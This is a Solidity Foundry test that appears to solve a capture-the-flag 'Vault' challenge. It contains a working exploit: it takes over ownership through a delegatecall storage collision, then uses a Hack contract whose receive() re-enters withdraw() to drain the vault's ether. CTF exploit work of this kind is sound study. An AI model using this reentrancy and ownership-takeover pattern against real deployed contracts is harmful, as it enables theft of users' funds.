// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        Hack hack = new Hack(address(vault));
        bytes32 data = bytes32(uint256(uint160(address(logic))));
        bytes memory callData = abi.encodeWithSignature("changeOwner(bytes32,address)", data, address(hack));
        address(vault).call(callData);
        hack.enableWithdraw();
        hack.deposit{value: 0.1 ether}();
        hack.withdraw();
        hack.transferETH();
        console.log("hackerBalance", palyer.balance);

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}

contract Hack {
    address public targetAddr;
    address private owner;

    constructor(address _targetAddr) {
        targetAddr = _targetAddr;
        owner = msg.sender;
    }

    function deposit() public payable {
        targetAddr.call{value: msg.value}(abi.encodeWithSignature("deposite()"));
    }

    function enableWithdraw() public {
        targetAddr.call(abi.encodeWithSignature("openWithdraw()"));
    }

    function withdraw() public {
        targetAddr.call(abi.encodeWithSignature("withdraw()"));
    }

    function transferETH() public {
        uint256 amount = address(this).balance;
        payable(owner).call{value: amount}("");
    }

    receive() external payable {
        if (targetAddr.balance > 0) {
            withdraw();
        }
    }
}

